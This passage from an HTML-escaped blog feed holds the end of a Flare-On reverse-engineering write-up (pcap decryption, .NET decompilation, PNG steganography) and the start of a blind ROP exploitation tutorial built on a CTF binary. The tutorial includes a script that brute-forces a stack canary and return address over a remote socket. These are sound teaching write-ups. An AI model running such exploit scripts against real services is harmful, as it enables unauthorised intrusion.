			&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data sent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;next we breakpoint after the decompression of the gzip data, note that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esi&lt;/code&gt; contains the address of the decrypted data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/zlib_esi.png&quot; alt=&quot;zlib_esi&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and automate the retrival of the decrypted data from memory:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_reg_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'esi'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xABABABAB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 0xAB bytes are always present after the decrypted message,
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;# so I used it as a break
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#print decrypted data
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resume_process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#iterate the loop till the next decryption
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wait_for_next_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#wait process until it hits the breakpoint&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we are able to get see the pcap data in clear text for example:
&lt;img src=&quot;/assets/img/flare-on/chall11/list_dir_1.png&quot; alt=&quot;list_dir_1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after decrypting everything, there is an http request to a special web page, so I extracted the response of it, and got the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/pass_zip.png&quot; alt=&quot;pass_zip&quot; /&gt;&lt;/p&gt;

&lt;p&gt;let’s save that to later use, and decrypt the SMBv2 data, same principal we can extract the both keys and use them to decrypt the encrypted data.&lt;/p&gt;

&lt;p&gt;We can see that he uses a certain binary to encrypt a zip file, interesting&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/crypt_zip.png&quot; alt=&quot;crypt_zip&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After decrypting the remaining SMBv2 data, we can see the binary been transmitted, let’s extract that!&lt;/p&gt;

&lt;p&gt;We now have a DotNet binary we can use &lt;strong&gt;dnspy&lt;/strong&gt; to decompile the it and &lt;strong&gt;de4dot&lt;/strong&gt; to deobsfucate it, here is the structure of the code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnspy_decompil.png&quot; alt=&quot;dnspy_decompil&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It asks for an input file and an output file as arguments first&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnspy_main.png&quot; alt=&quot;dnspy_main&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the interesting part starts in this function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnspy_http_request.png&quot; alt=&quot;dnspy_http_request&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we can see see an HTTP request made to retrieve the file &lt;strong&gt;README.md&lt;/strong&gt; from this url &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/johnsmith2121/react/blob/master/README.md&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;and then it extracts a certain base64 encoded string and decode it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnspy_extract_base64_data.png&quot; alt=&quot;dnspy_extract_base64_data&quot; /&gt;&lt;/p&gt;

&lt;p&gt;awesome, next it copies data to a memory_stream, including the hash of the input file, it’s size, and it’s content&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnspy_copy_data.png&quot; alt=&quot;dnspy_copy_data&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after that, it calls a certain function to encrypt the stream with &lt;strong&gt;AES CBC&lt;/strong&gt; as shown here&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnspy_aes.png&quot; alt=&quot;dnspy_aes&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after digging a bit, we can see that the &lt;strong&gt;IV&lt;/strong&gt; used is &lt;strong&gt;hardcoded&lt;/strong&gt;, and the &lt;strong&gt;key&lt;/strong&gt; is the previous base64 decoded data, if you remember correctly, we noticed a header in the pcap &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cryptar20180810&lt;/code&gt; before the encrypted part, we can assume that the encryption happened in &lt;strong&gt;10/08/2018&lt;/strong&gt;, which means that an &lt;strong&gt;older&lt;/strong&gt; &lt;strong&gt;README.md&lt;/strong&gt; version was used, so we have to extract the old base64 encoded data and use it as the key.&lt;/p&gt;

&lt;p&gt;For this part, I modified the binary and used it to decrypt the encrypted data from the pcap after removing the header of course, doing that we get a zip archive that asks for a password, hah let’s use the one found previously !&lt;/p&gt;

&lt;p&gt;We get two other files,&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Another DotNet binary&lt;/li&gt;
  &lt;li&gt;A PNG&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Briefly, the goal of the binary is to hide text in a PNG, by settings its RBG to (1, 0, 0)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnspy_set_color.png&quot; alt=&quot;dnspy_set_color&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Simple script to retrieve the text in the PNG&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'level9.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;pix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you liked my writeup, please take a look at my &lt;a href=&quot;https://github.com/soolidsnake&quot;&gt;github repo&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">x86_64 Blind Rop</title><link href="http://localhost:4000/2018/07/15/blindx86_64_rop.html" rel="alternate" type="text/html" title="x86_64 Blind Rop" /><published>2018-07-15T05:22:06-05:00</published><updated>2018-07-15T05:22:06-05:00</updated><id>http://localhost:4000/2018/07/15/blindx86_64_rop</id><content type="html" xml:base="http://localhost:4000/2018/07/15/blindx86_64_rop.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hoy, in this post I will introduce you to an advanced exploitation technique called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blind rop&lt;/code&gt;, so what is a blind rop?&lt;/p&gt;

&lt;p&gt;“The BROP attack makes it possible to write exploits without possessing the target’s binary. It requires a stack overflow and a service that restarts after a crash. Based on whether a service crashes or not (i.e., connection closes or stays open), the BROP attack is able to construct a full remote exploit that leads to a shell.” &lt;a href=&quot;http://www.scs.stanford.edu/brop/&quot;&gt;[1]&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;TL;TR, blind rop is a &lt;strong&gt;technique&lt;/strong&gt; used when we can’t get our hands on the vulnerable binary.
I will divide this attack into parts:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Looking for a vulnerability.&lt;/li&gt;
  &lt;li&gt;Extracting critical intel like canaries, the return address, OLD stack frame pointer etc… .&lt;/li&gt;
  &lt;li&gt;Searching for the right rop gadgets.&lt;/li&gt;
  &lt;li&gt;Dumping the binary and libc.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I will illustrate this technique by using a binary rom a capture the flag competition, so let’s get started !&lt;/p&gt;

&lt;h1 id=&quot;0-looking-for-a-vulnerability&quot;&gt;0) Looking for a vulnerability:&lt;/h1&gt;

&lt;p&gt;We first start by poking around, our goal is to find a vulnerability &lt;strong&gt;buffer overflow&lt;/strong&gt;, &lt;strong&gt;format string vulnerability&lt;/strong&gt; …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/blind_rop_find_vuln0.png&quot; alt=&quot;blind_rop_find_vuln0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After fuzzing the binary, we can find that if we input a large buffer the service crashes and no more “&lt;strong&gt;Bye!&lt;/strong&gt;” sadly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/blind_rop_find_vuln1.png&quot; alt=&quot;blind_rop_find_vuln1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This service has a &lt;strong&gt;buffer overflow&lt;/strong&gt; vulnerability ! and the lenght of the buffer is 40 bytes give it more and it crashes.&lt;/p&gt;

&lt;h1 id=&quot;1-extracting-critical-intel&quot;&gt;1) Extracting critical intel:&lt;/h1&gt;

&lt;p&gt;Our next goal is to leak critical intel from the stack, like &lt;strong&gt;canaries&lt;/strong&gt; if the binary has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack smashing protection&lt;/code&gt;, &lt;strong&gt;the return address&lt;/strong&gt;, and &lt;strong&gt;the old stack frame pointer&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To do so we will have to bruteforce byte by byte, if we receive the “&lt;strong&gt;Bye!&lt;/strong&gt;” that means its the correct byte.
Here is a small snippet of code:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bruteforce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# the service is using a function that stop reading when it hits a new line
&lt;/span&gt;				&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ERROR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	
			
			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'(chocolate/beer/hamburger): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'are out of stock&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

				&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Bye!'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;With this we can extract most information we need&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/blind_rop_leaking0.png&quot; alt=&quot;blind_rop_leaking0&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-searching-for-the-right-rop-gadgets&quot;&gt;2) Searching for the right rop gadgets:&lt;/h1&gt;

&lt;p&gt;To build our exploit we will need some important rop gadgets like: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rsi;pop r15;ret&lt;/code&gt; to be able to pass the first 2 arguments to functions.&lt;/p&gt;

&lt;p&gt;So our goal is to find those gadgets inside the binary, we can either start our scanning from the binary base, or from the return address.
The idea is to chain a rop gadget like the following:&lt;/p&gt;

